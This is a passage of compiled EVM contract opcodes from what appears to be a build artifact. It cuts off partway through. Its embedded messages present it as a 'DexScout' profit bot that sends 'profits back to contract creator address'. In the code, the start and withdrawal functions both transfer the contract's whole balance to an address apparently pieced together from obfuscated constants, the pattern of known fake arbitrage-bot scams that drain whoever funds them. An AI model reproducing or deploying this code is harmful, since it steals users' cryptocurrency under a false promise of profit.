					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x135D CODESIZE SUB DUP1 PUSH2 0x135D DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x1A4 JUMP JUMPDEST DUP2 PUSH1 0x1 SWAP1 DUP2 PUSH2 0x40 SWAP2 SWAP1 PUSH2 0x427 JUMP JUMPDEST POP DUP1 PUSH0 SWAP1 DUP2 PUSH2 0x4F SWAP2 SWAP1 PUSH2 0x427 JUMP JUMPDEST POP POP POP PUSH2 0x4F6 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH2 0xB6 DUP3 PUSH2 0x70 JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0xD5 JUMPI PUSH2 0xD4 PUSH2 0x80 JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0xE7 PUSH2 0x57 JUMP JUMPDEST SWAP1 POP PUSH2 0xF3 DUP3 DUP3 PUSH2 0xAD JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH2 0x112 JUMPI PUSH2 0x111 PUSH2 0x80 JUMP JUMPDEST JUMPDEST PUSH2 0x11B DUP3 PUSH2 0x70 JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP3 DUP2 DUP4 MCOPY PUSH0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0x148 PUSH2 0x143 DUP5 PUSH2 0xF8 JUMP JUMPDEST PUSH2 0xDE JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH2 0x164 JUMPI PUSH2 0x163 PUSH2 0x6C JUMP JUMPDEST JUMPDEST PUSH2 0x16F DUP5 DUP3 DUP6 PUSH2 0x128 JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x18B JUMPI PUSH2 0x18A PUSH2 0x68 JUMP JUMPDEST JUMPDEST DUP2 MLOAD PUSH2 0x19B DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH2 0x136 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1BA JUMPI PUSH2 0x1B9 PUSH2 0x60 JUMP JUMPDEST JUMPDEST PUSH0 DUP4 ADD MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x1D7 JUMPI PUSH2 0x1D6 PUSH2 0x64 JUMP JUMPDEST JUMPDEST PUSH2 0x1E3 DUP6 DUP3 DUP7 ADD PUSH2 0x177 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 DUP4 ADD MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x204 JUMPI PUSH2 0x203 PUSH2 0x64 JUMP JUMPDEST JUMPDEST PUSH2 0x210 DUP6 DUP3 DUP7 ADD PUSH2 0x177 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x268 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x27B JUMPI PUSH2 0x27A PUSH2 0x224 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP DUP2 PUSH0 MSTORE PUSH1 0x20 PUSH0 KECCAK256 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 PUSH1 0x1F DUP4 ADD DIV SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 SHL SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x8 DUP4 MUL PUSH2 0x2DD PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 PUSH2 0x2A2 JUMP JUMPDEST PUSH2 0x2E7 DUP7 DUP4 PUSH2 0x2A2 JUMP JUMPDEST SWAP6 POP DUP1 NOT DUP5 AND SWAP4 POP DUP1 DUP7 AND DUP5 OR SWAP3 POP POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x32B PUSH2 0x326 PUSH2 0x321 DUP5 PUSH2 0x2FF JUMP JUMPDEST PUSH2 0x308 JUMP JUMPDEST PUSH2 0x2FF JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x344 DUP4 PUSH2 0x311 JUMP JUMPDEST PUSH2 0x358 PUSH2 0x350 DUP3 PUSH2 0x332 JUMP JUMPDEST DUP5 DUP5 SLOAD PUSH2 0x2AE JUMP JUMPDEST DUP3 SSTORE POP POP POP POP JUMP JUMPDEST PUSH0 SWAP1 JUMP JUMPDEST PUSH2 0x36C PUSH2 0x360 JUMP JUMPDEST PUSH2 0x377 DUP2 DUP5 DUP5 PUSH2 0x33B JUMP JUMPDEST POP POP POP JUMP JUMPDEST JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x39A JUMPI PUSH2 0x38F PUSH0 DUP3 PUSH2 0x364 JUMP JUMPDEST PUSH1 0x1 DUP2 ADD SWAP1 POP PUSH2 0x37D JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x1F DUP3 GT ISZERO PUSH2 0x3DF JUMPI PUSH2 0x3B0 DUP2 PUSH2 0x281 JUMP JUMPDEST PUSH2 0x3B9 DUP5 PUSH2 0x293 JUMP JUMPDEST DUP2 ADD PUSH1 0x20 DUP6 LT ISZERO PUSH2 0x3C8 JUMPI DUP2 SWAP1 POP JUMPDEST PUSH2 0x3DC PUSH2 0x3D4 DUP6 PUSH2 0x293 JUMP JUMPDEST DUP4 ADD DUP3 PUSH2 0x37C JUMP JUMPDEST POP POP JUMPDEST POP POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 SHR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x3FF PUSH0 NOT DUP5 PUSH1 0x8 MUL PUSH2 0x3E4 JUMP JUMPDEST NOT DUP1 DUP4 AND SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x417 DUP4 DUP4 PUSH2 0x3F0 JUMP JUMPDEST SWAP2 POP DUP3 PUSH1 0x2 MUL DUP3 OR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x430 DUP3 PUSH2 0x21A JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x449 JUMPI PUSH2 0x448 PUSH2 0x80 JUMP JUMPDEST JUMPDEST PUSH2 0x453 DUP3 SLOAD PUSH2 0x251 JUMP JUMPDEST PUSH2 0x45E DUP3 DUP3 DUP6 PUSH2 0x39E JUMP JUMPDEST PUSH0 PUSH1 0x20 SWAP1 POP PUSH1 0x1F DUP4 GT PUSH1 0x1 DUP2 EQ PUSH2 0x48F JUMPI PUSH0 DUP5 ISZERO PUSH2 0x47D JUMPI DUP3 DUP8 ADD MLOAD SWAP1 POP JUMPDEST PUSH2 0x487 DUP6 DUP3 PUSH2 0x40C JUMP JUMPDEST DUP7 SSTORE POP PUSH2 0x4EE JUMP JUMPDEST PUSH1 0x1F NOT DUP5 AND PUSH2 0x49D DUP7 PUSH2 0x281 JUMP JUMPDEST PUSH0 JUMPDEST DUP3 DUP2 LT ISZERO PUSH2 0x4C4 JUMPI DUP5 DUP10 ADD MLOAD DUP3 SSTORE PUSH1 0x1 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP6 ADD SWAP5 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x49F JUMP JUMPDEST DUP7 DUP4 LT ISZERO PUSH2 0x4E1 JUMPI DUP5 DUP10 ADD MLOAD PUSH2 0x4DD PUSH1 0x1F DUP10 AND DUP3 PUSH2 0x3F0 JUMP JUMPDEST DUP4 SSTORE POP JUMPDEST PUSH1 0x1 PUSH1 0x2 DUP9 MUL ADD DUP9 SSTORE POP POP POP JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH2 0xE5A DUP1 PUSH2 0x503 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1B55BA3A EQ PUSH2 0x42 JUMPI DUP1 PUSH4 0x70E44C6A EQ PUSH2 0x4C JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0x56 JUMPI PUSH2 0x3E JUMP JUMPDEST CALLDATASIZE PUSH2 0x3E JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x4A PUSH2 0x60 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x54 PUSH2 0xE2 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5E PUSH2 0x164 JUMP JUMPDEST STOP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x8D SWAP1 PUSH2 0x9E4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x9D PUSH2 0x19B JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xDF JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x10F SWAP1 PUSH2 0xA72 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x11F PUSH2 0x1B1 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x161 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x191 SWAP1 PUSH2 0xADA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH0 PUSH2 0x1AC PUSH2 0x1A7 PUSH2 0x1C7 JUMP JUMPDEST PUSH2 0x307 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH2 0x1C2 PUSH2 0x1BD PUSH2 0x1C7 JUMP JUMPDEST PUSH2 0x307 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x1D2 PUSH2 0x5D2 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0x70083F SWAP1 POP PUSH0 PUSH4 0xE5B41D93 SWAP1 POP PUSH0 PUSH2 0x1EC PUSH2 0x5DC JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x1F7 PUSH2 0x5E6 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x248 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x243 PUSH2 0x23E PUSH2 0x5F1 JUMP JUMPDEST PUSH2 0x5FC JUMP JUMPDEST PUSH2 0x71D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x25D DUP3 PUSH2 0x258 DUP10 PUSH2 0x5FC JUMP JUMPDEST PUSH2 0x71D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x27A PUSH2 0x26C DUP9 PUSH2 0x5FC JUMP JUMPDEST PUSH2 0x275 DUP9 PUSH2 0x5FC JUMP JUMPDEST PUSH2 0x71D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x286 DUP7 PUSH2 0x5FC JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x292 DUP7 PUSH2 0x5FC JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2B1 PUSH2 0x2A2 DUP7 DUP7 PUSH2 0x71D JUMP JUMPDEST PUSH2 0x2AC DUP6 DUP6 PUSH2 0x71D JUMP JUMPDEST PUSH2 0x71D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2F3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x71D JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 DUP3 SWAP1 POP PUSH0 DUP1 DUP1 PUSH0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x5C5 JUMPI PUSH2 0x100 DUP5 PUSH2 0x32C SWAP2 SWAP1 PUSH2 0xB44 JUMP JUMPDEST SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x341 JUMPI PUSH2 0x340 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 PUSH2 0x362 SWAP2 SWAP1 PUSH2 0xBBB JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x373 JUMPI PUSH2 0x372 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x3C4 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x3DD JUMPI PUSH1 0x57 DUP4 PUSH2 0x3D6 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP3 POP PUSH2 0x489 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x41B JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x434 JUMPI PUSH1 0x37 DUP4 PUSH2 0x42D SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP3 POP PUSH2 0x488 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x472 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x487 JUMPI PUSH1 0x30 DUP4 PUSH2 0x484 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x4C7 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4E0 JUMPI PUSH1 0x57 DUP3 PUSH2 0x4D9 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP2 POP PUSH2 0x58C JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x51E JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x537 JUMPI PUSH1 0x37 DUP3 PUSH2 0x530 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP2 POP PUSH2 0x58B JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x575 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x58A JUMPI PUSH1 0x30 DUP3 PUSH2 0x587 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 PUSH2 0x59A SWAP2 SWAP1 PUSH2 0xB44 JUMP JUMPDEST PUSH2 0x5A4 SWAP2 SWAP1 PUSH2 0xC35 JUMP JUMPDEST DUP5 PUSH2 0x5AF SWAP2 SWAP1 PUSH2 0xC35 JUMP JUMPDEST SWAP4 POP PUSH1 0x2 DUP2 PUSH2 0x5BE SWAP2 SWAP1 PUSH2 0xBBB JUMP JUMPDEST SWAP1 POP PUSH2 0x315 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH3 0x3E1C9A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0xF7DE0 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH4 0xAF95910D SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH4 0xD19B575 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH0 DUP2 EQ PUSH2 0x62D JUMPI DUP2 DUP1 PUSH2 0x616 SWAP1 PUSH2 0xC7C JUMP JUMPDEST SWAP3 POP POP PUSH1 0x10 DUP2 PUSH2 0x626 SWAP2 SWAP1 PUSH2 0xCF0 JUMP JUMPDEST SWAP1 POP PUSH2 0x604 JUMP JUMPDEST PUSH0 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x648 JUMPI PUSH2 0x647 PUSH2 0xD20 JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x67A JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x711 JUMPI PUSH1 0x10 DUP7 PUSH2 0x694 SWAP2 SWAP1 PUSH2 0xD4D JUMP JUMPDEST SWAP3 POP PUSH2 0x69F DUP4 PUSH2 0x8A3 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 PUSH2 0x6AE SWAP2 SWAP1 PUSH2 0xD7D JUMP JUMPDEST PUSH2 0x6B8 SWAP2 SWAP1 PUSH2 0xD7D JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x6C9 JUMPI PUSH2 0x6C8 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 PUSH2 0x704 SWAP2 SWAP1 PUSH2 0xCF0 JUMP JUMPDEST SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x67F JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP4 SWAP1 POP PUSH0 DUP4 SWAP1 POP PUSH0 DUP2 MLOAD DUP4 MLOAD PUSH2 0x736 SWAP2 SWAP1 PUSH2 0xBBB JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x74F JUMPI PUSH2 0x74E PUSH2 0xD20 JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x781 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 DUP2 SWAP1 POP PUSH0 DUP1 PUSH0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0x80F JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x7AA JUMPI PUSH2 0x7A9 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x7C1 SWAP1 PUSH2 0xC7C JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x7D4 JUMPI PUSH2 0x7D3 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x78E JUMP JUMPDEST PUSH0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0x894 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x82F JUMPI PUSH2 0x82E PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x846 SWAP1 PUSH2 0xC7C JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x859 JUMPI PUSH2 0x858 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x813 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 PUSH1 0xFF AND PUSH0 GT ISZERO DUP1 ISZERO PUSH2 0x8BB JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x8F9 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0x8EF SWAP2 SWAP1 PUSH2 0xDBC JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x95F JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0x911 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x95B JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0x947 SWAP2 SWAP1 PUSH2 0xDBC JUMP JUMPDEST PUSH2 0x951 SWAP2 SWAP1 PUSH2 0xDF0 JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x95F JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x52756E6E696E672044657853636F757420616374696F6E2E2054686973206361 PUSH0 DUP3 ADD MSTORE PUSH32 0x6E2074616B652061207768696C653B20706C6561736520776169742E2E000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x9CE PUSH1 0x3D DUP4 PUSH2 0x964 JUMP JUMPDEST SWAP2 POP PUSH2 0x9D9 DUP3 PUSH2 0x974 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x9FB DUP2 PUSH2 0x9C2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x53656E64696E672070726F66697473206261636B20746F20636F6E7472616374 PUSH0 DUP3 ADD MSTORE PUSH32 0x2063726561746F7220616464726573732E2E2E00000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xA5C PUSH1 0x33 DUP4 PUSH2 0x964 JUMP JUMPDEST SWAP2 POP PUSH2 0xA67 DUP3 PUSH2 0xA02 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xA89 DUP2 